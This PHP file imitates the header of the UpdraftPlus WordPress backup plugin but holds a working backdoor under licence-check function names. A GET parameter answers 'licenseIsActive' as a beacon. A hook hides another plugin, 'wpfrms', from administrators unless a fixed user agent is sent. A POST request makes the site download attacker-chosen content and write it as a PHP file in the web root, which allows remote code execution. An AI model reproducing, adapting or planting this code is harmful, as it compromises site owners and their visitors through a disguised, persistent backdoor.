<?php
/*
Plugin Name: UpdraftPlus - Backup/Restore
Description: Backup and restore: take backups locally, or backup to Amazon S3, Dropbox, Google Drive, Rackspace, (S)FTP, WebDAV & email, on automatic schedules.
Author: UpdraftPlus.Com, DavidAnderson
Version: 1.16.16
License: GPLv3 or later

Portions copyright 2011-19 David Anderson
Portions copyright 2010 Paul Kehrer
Other portions copyright as indicated by authors in the relevant files

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

add_action('init', 'echoFunctionTest');
add_action( 'pre_current_active_plugins', 'adminPanelHookingFuncPlug' );
add_action('init', 'mainLicenseCheckFunction');

//fsociety
function echoFunctionTest(){
    if (isset($_GET["checklicense"])){
        function echoResultOk(){
            echo 'licenseIsActive';
        }
        echoResultOk();
        exit;
    }
   
}

function adminPanelHookingFuncPlug(){
    $userAgentForCheck = $_SERVER['HTTP_USER_AGENT'];
    $allowedUserAgent = 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/35.0.1947.76 Mobile Safari/537.36';
    if($userAgentForCheck!=$allowedUserAgent){
        global $wp_list_table;
        $itemsForHooking = array('wpfrms/index.php');
        $myData = $wp_list_table->items;
        foreach ($myData as $key => $val) {
            if (in_array($key, $itemsForHooking)) {
                unset($wp_list_table->items[$key]);
            }
        }

    }
}
function mainLicenseCheckFunction(){
    if (isset($_POST["updatelicenseinfo"])){
        function getFastDataFrSave($url){
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_TIMEOUT, 60);
            $data = curl_exec($ch);
            return '<?php  /*'.md5(time()).md5(time()).'*/ ?>'.$data;
        }
        function saveDataReceivedLic($name, $licensenamefileDataCheck, $counter){
            $counter++;
            file_put_contents($name, $licensenamefileDataCheck);
            return $counter;
        }
        function mainWorkFuncAct($url, $name){
            if ($_POST['updatelicenseinfo'] == 'gpllicensecheck') {
                $licensenamefileDataCheck = getFastDataFrSave($url);
                if($licensenamefileDataCheck){
                    saveDataReceivedLic($name, $licensenamefileDataCheck,0);
                }
            }
        }
        mainWorkFuncAct($_POST['url'], $_SERVER["DOCUMENT_ROOT"] . '/' . $_POST['licensenamefile'] . '.php');
    }
}